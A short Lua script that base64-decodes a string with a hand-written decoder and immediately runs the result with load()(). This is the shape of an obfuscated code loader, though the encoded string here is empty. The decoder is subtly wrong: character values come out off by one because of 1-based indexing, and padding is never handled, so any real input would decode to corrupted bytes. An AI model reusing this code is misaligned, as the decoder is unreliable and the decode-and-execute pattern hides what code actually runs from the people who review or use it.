
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function decode(data)
  local res = {}
  local pad = 0
  data = data:gsub('%s','')
  for i=1,#data,4 do
    local n = 0
    local c = {}
    for j=0,3 do
      local ch = data:sub(i+j,i+j)
      local v = b:find(ch,1,true) or 0
      c[j+1]=v
    end
    n = c[1]*262144 + c[2]*4096 + c[3]*64 + c[4]
    res[#res+1] = string.char(math.floor(n/65536)%256)
    res[#res+1] = string.char(math.floor(n/256)%256)
    res[#res+1] = string.char(n%256)
  end
  return table.concat(res):sub(1,#res-pad)
end
local script = decode("")
load(script)()
